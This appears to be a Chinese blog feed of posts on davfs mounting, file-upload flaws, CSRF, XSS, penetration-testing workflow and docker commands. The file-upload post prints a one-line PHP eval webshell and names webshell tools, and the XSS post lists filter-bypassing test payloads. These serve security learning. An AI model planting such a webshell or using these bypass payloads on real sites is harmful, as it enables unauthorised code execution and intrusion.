/mnt/cloud_disk/</code></pre><p>自动挂载(根据需求配置)</p><ul><li>自动挂载原理上就是开机执行一下手动挂载的命令</li><li>其它linux发行版自行查找设置开机自启脚本的方法，这里以debian作为演示</li></ul><p>把脚本写入到一个&#x2F;etc&#x2F;init.d&#x2F;的脚本文件里面</p><pre><code class="bash">echo &quot;mount -t davfs -o noexec https://dav.jianguoyun.com/dav /mnt/cloud_disk/&quot; &gt; /etc/init.d/cloud_disk.sh</code></pre><p>赋予执行权限并把这个脚本加入update-rc.d中</p><pre><code class="bash">chmod +x /etc/init.d/cloud_disk.shupdate-rc.d cloud_disk.sh defaults 99</code></pre><p>把脚本给到systemd来管理自启<br>创建一个.service的文件</p><pre><code class="gradle">touch /etc/systemd/system/cloud_disk.service</code></pre><p>添加以下内容</p><pre><code class="ini">[Unit]Description=My custom startup script [Service]ExecStart=/etc/init.d/cloud_disk.sh [Install]WantedBy=multi-user.target</code></pre><p>设置开机自启</p><pre><code class="bash">systemctl enable cloud_disk.servicesystemctl start cloud_disk.service</code></pre><p>加入到&#x2F;etc&#x2F;fstab</p><pre><code class="bash">echo &quot;https://dav.jianguoyun.com/dav/ /mnt/cloud_disk/ davfs user,noauto,x-systemd.automount 0 0&quot; &gt;&gt; /etc/fstab</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2025/01/05/%E7%BD%91%E5%AE%89/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/01/05/%E7%BD%91%E5%AE%89/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="一、文件上传漏洞的原理"><a href="#一、文件上传漏洞的原理" class="headerlink" title="一、文件上传漏洞的原理"></a>一、文件上传漏洞的原理</h1><p>文件上传漏洞是指攻击者通过某种方式将恶意文件上传到目标服务器，从而获取服务器控制权、篡改数据或执行其他恶意操作的安全漏洞。其原理主要包括以下几点：</p><ul><li>许多网站和应用程序都有合法的文件上传功能，比如用户上传头像、文档、图片等。正常情况下，服务器会对上传的文件进行一定的检查和处理。但是，如果这些检查机制不完善，攻击者就可以利用这个合法的上传途径，上传恶意文件。</li><li>例如，一个允许用户上传图片的论坛，正常情况下应该只允许上传符合规定格式（如 JPEG、PNG 等）的图像文件。但是，如果服务器端没有对文件类型进行严格验证，攻击者就可能上传一个包含恶意脚本的 PHP 文件，伪装成图片文件（通过修改文件扩展名等手段）。</li></ul><h1 id="二、webshell"><a href="#二、webshell" class="headerlink" title="二、webshell"></a>二、webshell</h1><p>webshell的收集项目地址（<a href="https://github.com/tennc/webshell">链接</a>）包含了各种常用的webshell<br><strong>1、一句话木马</strong></p><ul><li>代码短，只有一行代码。</li><li>场景多，可以单独生产文件，也可以</li><li>插入到图片中，安全性高，隐秘性强，可变形免杀</li></ul><pre><code class="php">&lt;?php&gt;    @eval($_POST[&#39;muma&#39;]);&lt;?&gt;</code></pre><p><strong>2、小马</strong></p><ul><li>体积小，功能少</li><li>只有文件上传功能</li></ul><p><strong>3、大马</strong></p><ul><li>体积大、功能全</li><li>能够管理数据库、文件管理、对站点进行快速的信息收集，甚至能够提权</li></ul><h1 id="webshell工具"><a href="#webshell工具" class="headerlink" title="webshell工具"></a>webshell工具</h1><p>中国菜刀<br>中国蚁剑<br>weevely<br>哥斯拉 godzilla<br>冰蝎 behinder</p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 网安 </tag>
            
            <tag> 测试 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞分析与防御</title>
      <link href="/2024/12/29/%E7%BD%91%E5%AE%89/CSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
      <url>/2024/12/29/%E7%BD%91%E5%AE%89/CSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、CSRF漏洞的概念"><a href="#一、CSRF漏洞的概念" class="headerlink" title="一、CSRF漏洞的概念"></a>一、CSRF漏洞的概念</h1><p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击</p><h2 id="CSRF漏洞的防御"><a href="#CSRF漏洞的防御" class="headerlink" title="CSRF漏洞的防御"></a>CSRF漏洞的防御</h2><blockquote><p>1、判断一个请求来自于本网站，还是来自于第三方网站(Referer来源)<br>2、对敏感信息的操作增加安全的token；<br>3、对敏感信息的操作增加安全的验证码；<br>4、对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 网安 </tag>
            
            <tag> 测试 </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cisp-pte学习笔记</title>
      <link href="/2024/12/29/%E7%BD%91%E5%AE%89/cisp-pte%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/12/29/%E7%BD%91%E5%AE%89/cisp-pte%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p><strong>cisp-pte认证介绍</strong><br>cisp-pte隶属于cisp，cisp全称<code>注册信息安全专业人员</code>(Certified Information Security Professional)</p><p><strong>cisp-pte认证</strong></p><ul><li>国内首个国家级技能认证证书</li><li>国内评定安全服务工程师是否具备渗透测试资质的唯一证书</li><li>实操技能考核为主（80%），理论知识考察为辅(20%)</li></ul><p><strong>颁发机构</strong>：中国信息安全评测中心</p><h1 id="二、渗透测试"><a href="#二、渗透测试" class="headerlink" title="二、渗透测试"></a>二、渗透测试</h1><p><strong>渗透测试概念：</strong><br>  渗透测试是模拟黑客攻击，通过识别、利用系统漏洞，评估安全风险并提出改进建议的安全评估方法。</p><h2 id="1、渗透测试分类："><a href="#1、渗透测试分类：" class="headerlink" title="1、渗透测试分类："></a>1、渗透测试分类：</h2><table><thead><tr><th>分类</th><th>描述</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>黑盒渗透测试</td><td>测试人员没有目标系统的任何信息，从外部进行测试，模拟黑客攻击行为。</td><td>完全模拟外部攻击者，接近真实攻击。</td><td>测试时间较长，效率较低。</td></tr><tr><td>白盒渗透测试</td><td>测试人员拥有目标系统的详细信息，如源代码、系统架构、网络拓扑等。</td><td>深入评估系统安全性，发现设计和实现中的漏洞。</td><td>不完全模拟外部攻击，可能错失外部攻击视角。</td></tr><tr><td>灰盒渗透测试</td><td>测试人员拥有部分目标系统的信息(如部分源代码或有限的访问权限)。</td><td>结合外部攻击与内部漏洞测试，高效深入。</td><td>无法完全测试所有可能的漏洞。</td></tr></tbody></table><p><strong>网络安全分类：</strong><br>1、二进制安全:对软件进行破解。<br>2、web安全:对在线的网站进行破解，从而达到某些目的性。RCE<br>3、工控安全:工厂自动化系统的入侵<br>4、物联网安全:家里的路由器，冰箱，微波炉，电视机等都可以通过APP或者其他方式进行控制。<br>5、数据安全<br>6、社会工程学 :欺骗的艺术</p><h2 id="2、渗透测试流程："><a href="#2、渗透测试流程：" class="headerlink" title="2、渗透测试流程："></a>2、渗透测试流程：</h2><table><thead><tr><th>阶段</th><th>目的</th><th>活动</th></tr></thead><tbody><tr><td>1、信息收集</td><td>收集目标系统的公开信息，为后续攻击做准<br/>备</td><td>1、使用搜索引擎，社交媒体、WHOIS等收集<br/>信息<br/>2、网络扫描，识别开放端口和服务DNS查询                                                  3、收集子域名等信息</td></tr><tr><td>2、扫描与枚举</td><td>识别系统中的漏洞和弱点</td><td>1、端口扫描(如使用Nmap)<br/>2、漏洞扫描(如使用Nessus、OpenVAS)<br/>3、服务枚举，识别服务版本</td></tr><tr><td>3、漏洞利用</td><td>利用已发现的漏洞进行攻击，尝试获得系统控制权。</td><td>1、漏洞利用，攻击漏洞(如SQL注入、缓冲区溢出等)<br/>2、社会工程学攻击(如钓鱼邮件、电话欺骗)<br/>3、后渗透操作，进一步控制目标</td></tr><tr><td>4、权限提升与横向移动</td><td>提升权限，并在系统中横向移动，获取更多敏感数据。</td><td>1、权限提升(通过漏洞、弱密码等)<br/>2、横向移动，渗透到更多系统或账户</td></tr><tr><td>5、数据收集与分析</td><td>收集目标系统的敏感数据，验证渗透测试结果</td><td>1、收集密码文件、配置文件、数据库等敏感信息<br/>2、保存测试过程中的证据</td></tr><tr><td>6、清理与恢复</td><td>清理渗透测试中留下的痕迹，恢复系统至原始状态。</td><td>1、删除测试过程中创建的账户、脚本、日志等<br/>2、确保系统恢复至测试前状态</td></tr><tr><td>7、报告与修复建议</td><td>生成渗透测试报告，提供修复建议。</td><td>1、攒写测试报告，记录漏洞、攻击方式和影响<br/>2、提供修复建议，帮助组织改进安全性</td></tr></tbody></table><h2 id="3、PTES渗透测试执行标准："><a href="#3、PTES渗透测试执行标准：" class="headerlink" title="3、PTES渗透测试执行标准："></a>3、PTES渗透测试执行标准：</h2><blockquote><p>PTES(Penetration Testing ExecutionStandard，渗透测试执行标准)是一个广泛使用的渗透测试框架，旨在规范和标准化渗透测试的执行过程，确保渗透测试的高效性和系统性。它为渗透测试人员提供了一个结构化的指南，涵盖了渗透测试的各个阶段。</p></blockquote><table><thead><tr><th>阶段</th><th>描述</th></tr></thead><tbody><tr><td>1.前期交互(Pre-engagement<br/>Interactions)</td><td>在测试开始之前，测试团队与客户进行沟通，明确测试的范国、目标、限制以及相关协议，此阶段还包括与客户达成协议，确保测试活动合法、道德。</td></tr><tr><td>2.信息收集(Information<br/>Gathering)</td><td>收集目标系统的公开信息，包括域名、IP地址、员工信息等，通常使用OSINT(开源情报)技术，通过此阶段了解目标的基本结构、攻击面及潜在的漏洞。</td></tr><tr><td>3.威助建模(Threat Modeling)</td><td>根把收集到的信息，识别潜在的攻击者、攻击路径及可能利用的漏洞，通过评估威胁建模帮助确定最优的攻击路径。</td></tr><tr><td>4.漏洞分析(Vulnerability<br/>Analysis)</td><td>使用自动化工具和手动技术分析目标系统的漏洞，查找应用程序、网络和系统的已知漏洞，识别出可能的攻击入口。</td></tr><tr><td>5.渗透攻击(Exploitation)</td><td>利用已发现的漏洞进行攻击，验证漏洞是否可被利用，尝试获取系统访问权限。此阶段模拟真实黑客攻击，验证漏洞的严重性。</td></tr><tr><td>6.后渗透攻击(Post-<br/>exploitation)</td><td>成功渗透系统后，进行权限提升、横向渗透、敏感数据获取等操作，以模拟攻击者在完全控制系统后的行为，通过此阶段帮助识别潜在的长期风险。</td></tr><tr><td>7.报告编写(Reporting)</td><td>编写渗透测试报告，记录所有测试活动、发现的漏洞、成功利用的攻击路径以及影响评估。报告还应提供修复建议和提高安全性的措施。</td></tr><tr><td>8.漏洞修复与再评估<br/>(Remediation &amp; Re-testing)</td><td>客户对报告中的漏洞进行修复后，渗透测试团队应进行再测试，验证漏洞是否已修复，并评估修复效果。</td></tr></tbody></table><h2 id="4、信息收集"><a href="#4、信息收集" class="headerlink" title="4、信息收集"></a>4、信息收集</h2><p><strong>主动信息收集</strong><br>通过直接访问、扫描网站，这种流量将流经网站。<br><strong>被动信息收集</strong><br>利用第三方的服务对目标进行访问。<br><img src="https://picture.tanglx.cn/web/2025/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.png" alt="enter description here"></p><h2 id="5、常见端口"><a href="#5、常见端口" class="headerlink" title="5、常见端口"></a>5、常见端口</h2><table><thead><tr><th>端口</th><th>风险描述</th><th>其它</th></tr></thead><tbody><tr><td>21、69</td><td>FTP&#x2F;TFTP服务，可能存在弱口令暴破匿名用户登录</td><td></td></tr><tr><td>22</td><td>SSH服务，可能存在弱口令暴破，端口映射</td><td></td></tr><tr><td>80</td><td>HTTP端口，常见web漏洞都可能存在</td><td></td></tr><tr><td>389</td><td>LDAP目录访问协议，有可能存在注入，弱口令，域控开放此端口</td><td></td></tr><tr><td>445</td><td>SMB服务端口，永恒之蓝等</td><td></td></tr><tr><td>2475</td><td>Docker端口，可能存在Docker提权、Docker逃逸</td><td></td></tr><tr><td>3389</td><td>RDP服务，可能存在弱口令漏洞或者CVE-2019-0708</td><td></td></tr><tr><td>6379</td><td>Redis数据库端口，可能存在Redis未授权访问漏洞、主从复制等</td><td></td></tr><tr><td>7001、7002</td><td>Weblogic，可能存在各种Weblogic反序列化漏洞</td><td></td></tr><tr><td>3306</td><td>MySQL数据库，可能存在弱口令暴破、注入、UDF提权等</td><td></td></tr><tr><td>1433</td><td>SQL Server数据库可能存在爆破、注入、xp_cmdshell提权等</td><td></td></tr><tr><td>5900</td><td>VNC服务，可能存在爆破、弱口令认证绕过</td><td></td></tr></tbody></table><h2 id="6、http协议"><a href="#6、http协议" class="headerlink" title="6、http协议"></a>6、http协议</h2><p><strong>http工作特点：</strong><br>1、无状态、2、支持c&#x2F;s模式、3、无连接、4、灵活、5、简单快速</p><p><strong>Cookie：</strong><br>Cookie是通过客户端保持状态的解决方案。从定义上来说，Cookie就是由服务器发给客户端的特殊信息，而这些信息以文本文件的方式存放在客户端，然后客户端每次尚服务器发送请求的时候都会带上这些特殊的信息<br>特点：<code>存储在客户端</code></p><p><strong>Session:</strong><br>Session叫会话，主要是用来检查请求数据中的Cookie字段是否在服务器存在和是否合法.<br>特点：<code>存储在服务端</code></p><p><strong>Cookie和Session的联系：</strong><br>由于HTTP协议是无状态，这个时候就需要有一个机制来告诉服务端本次操作用户是否登录，是哪个用户在执行的操作，那这套机制的实现就需要 Cookie和Session配合。</p><p><strong>报文请求格式:</strong><br>第一部分:请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本，请求类型为<code>POST</code> 要访问的资源为<code>/</code> ，该行的最后一部分说明使用的是HTTP1.1版本。<br>第二部分:请求头部用来说明服务器要使用的附加信息。<br>第三部分:空行，空行是必须的。第四部分的请求数据为空，也必须有空行。<br>第四部分:请求数据也叫主体，可以添加任意的其他数据。</p><p><img src="https://picture.tanglx.cn/web/2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250323210604.png" alt="报文请求格式"></p><p><strong>请求类型：</strong></p><table><thead><tr><th><strong>方法</strong></th><th><strong>用途</strong></th><th><strong>参数位置</strong></th><th><strong>安全性</strong></th><th><strong>幂等性</strong></th><th><strong>请求体支持</strong></th><th><strong>缓存</strong></th></tr></thead><tbody><tr><td><strong>GET</strong></td><td>从服务器获取数据（查询操作）</td><td>参数附加在 <strong>URL</strong> 后（?key&#x3D;value）</td><td>安全</td><td>幂等</td><td>不支持</td><td>可缓存</td></tr><tr><td><strong>POST</strong></td><td>向服务器提交数据（写入操作）</td><td>参数放在 HTTP <strong>请求体</strong>（Body）中</td><td>不安全</td><td>非幂等</td><td>支持</td><td>默认不缓存</td></tr><tr><td><strong>PUT</strong></td><td>替换资源（完整更新）</td><td>URL路径标识 + <strong>请求体</strong></td><td>不安全</td><td>幂等</td><td>支持</td><td>不可缓存</td></tr><tr><td><strong>PATCH</strong></td><td>部分更新资源</td><td>URL路径标识 + <strong>请求体</strong></td><td>不安全</td><td>非幂等</td><td>支持</td><td>不可缓存</td></tr><tr><td><strong>DELETE</strong></td><td>删除资源</td><td><strong>URL路径标识</strong>（如 <code>/res/123</code>）</td><td>不安全</td><td>幂等</td><td>支持（可选）</td><td>不可缓存</td></tr><tr><td><strong>HEAD</strong></td><td>获取资源元数据（无响应体）</td><td><strong>URL 查询参数</strong></td><td>安全</td><td>幂等</td><td>不支持</td><td>可缓存</td></tr><tr><td><strong>OPTIONS</strong></td><td>获取服务器支持的请求方法或跨域配置</td><td><strong>URL路径或全局</strong></td><td>安全</td><td>幂等</td><td>不支持</td><td>不可缓存</td></tr><tr><td><strong>TRACE</strong></td><td>回显客户端请求（用于调试）</td><td><strong>URL路径</strong></td><td>安全</td><td>幂等</td><td>不支持</td><td>不可缓存</td></tr><tr><td><strong>CONNECT</strong></td><td>建立隧道（用于代理转发 HTTPS）</td><td><strong>目标主机和端口</strong></td><td>不安全</td><td>非幂等</td><td>支持</td><td>不可缓存</td></tr></tbody></table><h1 id="三、注入漏洞"><a href="#三、注入漏洞" class="headerlink" title="三、注入漏洞"></a>三、注入漏洞</h1><h1 id="四、文件处理漏洞"><a href="#四、文件处理漏洞" class="headerlink" title="四、文件处理漏洞"></a>四、文件处理漏洞</h1><h1 id="五、跨站脚本（xss）漏洞、请求伪造漏洞"><a href="#五、跨站脚本（xss）漏洞、请求伪造漏洞" class="headerlink" title="五、跨站脚本（xss）漏洞、请求伪造漏洞"></a>五、跨站脚本（xss）漏洞、请求伪造漏洞</h1><h1 id="六、访问控制漏洞-会话管理漏洞"><a href="#六、访问控制漏洞-会话管理漏洞" class="headerlink" title="六、访问控制漏洞 会话管理漏洞"></a>六、访问控制漏洞 会话管理漏洞</h1><h1 id="七、Windows操作系统、linux操作系统"><a href="#七、Windows操作系统、linux操作系统" class="headerlink" title="七、Windows操作系统、linux操作系统"></a>七、Windows操作系统、linux操作系统</h1><h1 id="八、中间件安全、数据库安全"><a href="#八、中间件安全、数据库安全" class="headerlink" title="八、中间件安全、数据库安全"></a>八、中间件安全、数据库安全</h1>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> cisp-pte </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss漏洞</title>
      <link href="/2024/12/22/%E7%BD%91%E5%AE%89/xss%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/12/22/%E7%BD%91%E5%AE%89/xss%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="一、xss漏洞概念"><a href="#一、xss漏洞概念" class="headerlink" title="一、xss漏洞概念"></a>一、xss漏洞概念</h2><p>XSS（跨站脚本攻击，Cross-Site Scripting）是一种安全漏洞，它允许攻击者在网页上注入恶意脚本。这些脚本可能用于盗取cookie，盗取用户数据、操纵DOM、进行网络钓鱼等。</p><h2 id="二、xss漏洞解决办法"><a href="#二、xss漏洞解决办法" class="headerlink" title="二、xss漏洞解决办法"></a>二、xss漏洞解决办法</h2><blockquote><p>1、对所有的输入进行过滤和清理，确保输入的数据不包含任何可能导致XSS的字符或序列。</p><p>2、对所有的输出进行编码，确保输出的数据不会被浏览器解释为代码。</p><p>3、使用内容安全策略（CSP），它能有效地限制网页上可以加载的资源。</p><p>4、使用HTTPOnly标志，防止脚本通过document.cookie获取cookie数据。</p><p>5、对于富文本内容，使用可信的HTML解析器，并进行适当的转义。</p></blockquote><h2 id="三、xss漏洞payload"><a href="#三、xss漏洞payload" class="headerlink" title="三、xss漏洞payload"></a>三、xss漏洞payload</h2><p> 在某个网页的提交内容处添加以下代码，测试是否有弹窗跳出，如果有则说明，该网站存在漏洞<br> <a href="https://github.com/payloadbox/xss-payload-list.git">更多payload</a><br> <strong>典型脚本</strong></p><pre><code class="javascript">&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p><strong>利用 HTML 标签的属性脚本</strong></p><pre><code class="javascript">&quot;&gt;&lt;img src=x οnerrοr=alert(&quot;XSS&quot;);&gt;&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;);&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;</code></pre><p><strong>变形方法脚本</strong><br>大小写</p><pre><code class="javascript">&lt;sCript&gt;alert(&#39;xss&#39;)&lt;/Script&gt;        将标签中的部分小写字母改为大写</code></pre><p>双写</p><pre><code class="javascript">&lt;scrscriptipt&gt;alert(&#39;xss&#39;)&lt;/scrscriptipt&gt;        对原来的&lt;script&gt;标签变形</code></pre><p>引号</p><pre><code class="javascript">&lt;img src=&quot;#&quot; onerror=&quot;alert(&#39;xss&#39;)&quot;/&gt;        双引号包裹执行命令的alert函数&lt;img src=&quot;#&quot; onerror=alert`xss`/&gt;        反引号代替括号包裹xss内容</code></pre><p>&#x2F; 代替空格</p><pre><code class="javascript">&lt;img/src=&#39;#&#39;/onerror=&#39;alert(&#39;xss&#39;)&#39;/&gt;</code></pre><p>Tab 与回车</p><pre><code class="javascript">在语句中穿插 Tab和回车&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;click me!&lt;/a&gt;</code></pre><p>编码</p><pre><code class="javascript">&lt;a href=&quot;j&amp;#97;v&amp;#x61;script:alert(&#39;xss&#39;)&gt;click me!&lt;/a&gt;        HTML实体编码%3Cscript%3Ealert(&#39;xss&#39;)%3C/script%3E        URL编码</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 网安 </tag>
            
            <tag> 测试 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试的流程</title>
      <link href="/2024/12/10/%E7%BD%91%E5%AE%89/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/12/10/%E7%BD%91%E5%AE%89/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、渗透测试的流程"><a href="#一、渗透测试的流程" class="headerlink" title="一、渗透测试的流程"></a>一、渗透测试的流程</h1><h2 id="1-确认目标"><a href="#1-确认目标" class="headerlink" title="1.确认目标"></a>1.确认目标</h2><ul><li>范围</li><li>规则（限制条件）</li><li>需求</li><li>授权(确定哪些能做，哪些不能做)</li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集*"></a>2.信息收集*</h2><p>域名信息、ip段、开放的端口、网站架构、文件目录结构、软件版本、waf、旁站、c段、社会工程学类(收集信息)..</p><h2 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3.漏洞扫描"></a>3.漏洞扫描</h2><ul><li>权威的漏洞数据库平台</li></ul><p>国家信息安全漏洞库(CNNVD)<a href="https://www.cnnvd.org.cn/">网址</a><br>国家信息安全漏洞共享平台(CNVD) <a href="https://www.cnvd.org.cn/">网址</a><br>国家工业信息安全漏洞库(CICSVD) <a href="https://www.cics-vd.org.cn/">网址</a><br>CVE <a href="https://cve.mitre.org/">网址</a></p><ul><li>使用扫描工具</li></ul><h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><p>攻击<br>防御绕过(防火墙、waf、ids、监控系统)<br>维持访问(后渗透访问)</p><h2 id="5-形成报告-清除痕迹"><a href="#5-形成报告-清除痕迹" class="headerlink" title="5.形成报告&#x2F;清除痕迹"></a>5.形成报告&#x2F;清除痕迹</h2><p>发现了什么漏洞<br>危害性(低危、中危、高危)<br>怎么发现的<br>如何复现<br>原因分析<br>修补建议</p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 网安 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>armbian小主机部署博客系统</title>
      <link href="/2024/11/20/%E6%8A%98%E8%85%BE/armbian%E5%B0%8F%E4%B8%BB%E6%9C%BA%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/11/20/%E6%8A%98%E8%85%BE/armbian%E5%B0%8F%E4%B8%BB%E6%9C%BA%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-安装nginx等环境"><a href="#1-安装nginx等环境" class="headerlink" title="1.安装nginx等环境"></a>1.安装nginx等环境</h1><p>nginx相比apache更加轻量节省空间</p><pre><code class="javascript">sudo apt updatesudo apt upgradesudo systemctl restart nginxsudo apt install php-sqlite3sudo apt install php7.3 php7.3-fpm php7.3-cli</code></pre><p>配置Nginx与PHP-FPM</p><pre><code class="javascript">vim /etc/nginx/sites-available/default</code></pre><p>添加</p><pre><code class="javascript">location ~ \.php$ &#123;    include snippets/fastcgi-php.conf;    fastcgi_pass unix:/run/php/php7.3-fpm.sock;&#125;</code></pre><p>重启nginx与php-fpm</p><pre><code class="javascript">sudo systemctl restart nginxsudo systemctl restart php7.3-fpm</code></pre><p>测试安装</p><pre><code class="javascript">echo &quot;&lt;?php phpinfo(); ?&gt;&quot; | sudo tee /var/www/html/info.php</code></pre><p>在浏览器中访问http:&#x2F;&#x2F;<your_server_ip>&#x2F;info.php，你应该看到PHP信息页面。如果页面显示了PHP版本，说明安装成功</p><h1 id="2-安装zblog"><a href="#2-安装zblog" class="headerlink" title="2.安装zblog"></a>2.安装zblog</h1><p><a href="https://www.zblogcn.com/">官网</a><br>本机使用版本为1.7</p>]]></content>
      
      
      <categories>
          
          <category> 折腾 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> armbian </tag>
            
            <tag> 折腾 </tag>
            
            <tag> 博客 </tag>
            
            <tag> zblog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker基本使用</title>
      <link href="/2024/11/20/%E5%B7%A5%E5%85%B7/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/11/20/%E5%B7%A5%E5%85%B7/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="一、docker安装"><a href="#一、docker安装" class="headerlink" title="一、docker安装"></a>一、docker安装</h1><p><strong>1.官网方式安装</strong><br><strong>2.docker网页管理工具</strong><br><em>docker正确安装后使用命令安装</em><br>安装中文版 2.19.5 </p><pre><code class="javascript"> docker run -d --restart=always --name=&quot;portainer&quot; -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock 6053537/portainer-ce</code></pre><p>安装中文版2.11.0 </p><pre><code class="javascript"> docker run -d --restart=always --name=&quot;portainer&quot; -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock newrain857/portainer-ce-cn</code></pre><h1 id="二、常用命令"><a href="#二、常用命令" class="headerlink" title="二、常用命令"></a>二、常用命令</h1><p><a href="https://blog.csdn.net/qq_44700578/article/details/136456291">详细博客</a></p><h2 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1.基础命令"></a>1.基础命令</h2><pre><code class="shell">systemctl start docker           #启动dockersystemctl stop docker            #关闭dockersystemctl restart docker         #重启dockersystemctl enable docker          #设置开机自启动systemctl status docker          #查看docker运行状态systemctl status docker.service     #查询Docker服务状态docker version                   #查看docker版本号信息docker info                      #查看docker相关信息，包括版本信息、镜像和容器数量等docker stats                     #检查docker守护进程是否在运行docker --help                    #docker命令提示</code></pre><h2 id="2-docker镜像命令"><a href="#2-docker镜像命令" class="headerlink" title="2.docker镜像命令"></a>2.docker镜像命令</h2><pre><code class="shell">docker images  #查看镜像#从Docker Hub查找/搜索镜像docker search [options] TERM      docker search -f STARS=9000 mysql  #搜索stars收藏数不小于10以上的mysql镜像#从服务器拉取镜像拉取镜像docker pull 镜像名       #拉取最新版本的镜像docker pull 镜像名:tag   #拉取镜像，指定版本#推送镜像到服务docker push 镜像名docker push 镜像名:tagdocker save -o 保存的目标文件名称 镜像名 #保存镜像为一个压缩包docker load -i 文件名    #加载压缩包为镜像#删除镜像。当前镜像没有被任何容器使用 才可以删除docker rmi 镜像名/镜像ID     #删除镜像 docker rmi -f 镜像名/镜像ID  #强制删除docker rmi -f 镜像名 镜像名 镜像名     #删除多个 其镜像ID或镜像用用空格隔开即可 docker rmi -f $(docker images -aq)  #删除全部镜像，-a 意思为显示全部, -q 意思为只显示IDdocker image rm 镜像名称/镜像ID  #强制删除镜像#给镜像打标签【有时候根据业务需求 需要对一个镜像进行分类或版本迭代操作，此时就需要给镜像打上标签】docker tag SOURCE_IMAGE[:TAG] TARGET_IMAGE[:TAG]</code></pre><h2 id="3-docker容器命令"><a href="#3-docker容器命令" class="headerlink" title="3.docker容器命令"></a>3.docker容器命令</h2><pre><code class="shell">docker ps      #显示正在运行的容器docker ps -a   #-a,--all  显示全部容器，包括已停止的（默认只显示运行中的容器）#容器怎么来？ docker run 创建并运行一个容器，处于运行状态。#--name 给要运行的容器起的名字；   -p 将宿主机端口与容器端口映射，冒号左侧是宿主机端口，右侧是容器端口；   -d 表示可后台运行容器 （守护式运行）。具体样例见下docker run --name containerName -p 80:80 -d nginx  docker pause 容器名/容器ID    #让一个运行的容器暂停docker unpause name  #让一个容器从暂停状态恢复运行docker stop name     #停止一个或多个运行的容器（杀死进程、回收内存，仅剩文件系统）docker start name    #让一个停止的容器再次运行docker start mysql redis rabbitmq nginx   #启动多个容器docker restart name  